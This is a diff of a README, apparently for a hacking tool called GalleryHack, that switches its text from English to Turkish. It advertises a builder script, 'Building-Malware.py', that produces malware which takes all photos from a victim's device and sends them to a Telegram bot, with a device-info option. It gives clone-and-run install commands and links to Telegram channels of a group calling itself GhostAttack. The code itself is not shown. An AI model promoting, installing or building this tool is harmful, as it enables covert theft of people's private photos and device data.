@@ -1,33 +1,32 @@
-# Malware
-Powered By [GhostAttack](https://Telegram.me/BlackCode_22) Team
-Toole Dead Code get Image to send bot Telegram from skript and more ...
+# TELEGRAM KANAL
+DEVELOPER [GhostAttack](https://Telegram.me/DarkNebulaHack) 
 
-## Screenshot:
-<img src="https://github.com/deadcode22/Hack-image/blob/main/1.jpg"> <img src="https://github.com/deadcode22/Hack-image/blob/main/2.jpg">
-<img src="https://github.com/deadcode22/Hack-image/blob/main/3.jpg">
 
-### Installation : 
 
-` git clone https://github.com/deadcode22/Hake-image.git `
 
-` cd Hake-image `
+
+### Yükleme : 
+
+` git clone https://github.com/deadcode22/GalleryHack `
+
+` cd GalleryHack `
 
 ` python3 Building-Malware.py `
 
-## Feature : 
-> FAST AND EASY
+## İçerikler : 
+> HIZLI VE KOLAY
 
-> Get Full Image
+> TÜM FOTOGRAFLARI ÇEKER
 
-> Get Skript from bot 
+> ÇEKTİĞİ FOTOĞRAFLARI TELEGRAM BOTUNA GÖNDERİR 
 
-> fully Support 
+> DEVELOPER y1gitreal 
 
-> Good Design
+> GÜZEL TASARIM 
 
-## Used :  
-> 1  == Attack Image 
+## Kullanım :  
+> 1  == GALERİ HACK 
 
-> 2  == Attack System 
+> 2  == CİHAZ İNFO 
 
-### Support Telegram Channel : [Telegram Dead Code](https://t.me/BlackCode_22)
+### TELEGRAM : [Telegram Dark Nebula Hack ](https://t.me/DarkNebulaHack)
